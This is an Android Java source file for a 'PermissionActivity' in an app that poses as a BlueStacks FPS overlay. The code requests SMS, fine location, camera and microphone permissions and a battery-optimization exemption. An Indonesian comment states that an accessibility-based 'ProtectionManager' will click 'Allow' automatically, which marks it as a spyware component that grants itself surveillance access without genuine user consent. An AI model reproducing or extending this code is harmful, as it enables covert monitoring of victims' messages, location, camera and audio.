package com.bluestacks.fpsoverlay;

import android.content.Intent;
import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class PermissionActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Intent intent = getIntent();
        if (intent != null) {
            String type = intent.getStringExtra("type");
            String[] perms;
            
            if ("all".equals(type)) {
                perms = new String[]{
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.RECORD_AUDIO
                };
            } else if ("sms".equals(type)) {
                perms = new String[]{android.Manifest.permission.READ_SMS};
            } else if ("location".equals(type)) {
                perms = new String[]{android.Manifest.permission.ACCESS_FINE_LOCATION};
            } else if ("camera".equals(type)) {
                perms = new String[]{android.Manifest.permission.CAMERA};
            } else if ("mic".equals(type)) {
                perms = new String[]{android.Manifest.permission.RECORD_AUDIO};
            } else if ("battery".equals(type)) {
                checkBatteryOptimization();
                finish();
                return;
            } else {
                finish();
                return;
            }
            
            ActivityCompat.requestPermissions(this, perms, 100);
        } else {
            finish();
        }
    }

    private void checkBatteryOptimization() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception ignored) {}
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Kita tidak peduli hasilnya di sini karena ProtectionManager (Accessibility) yang akan meng-klik 'Allow'
        finish();
    }
}
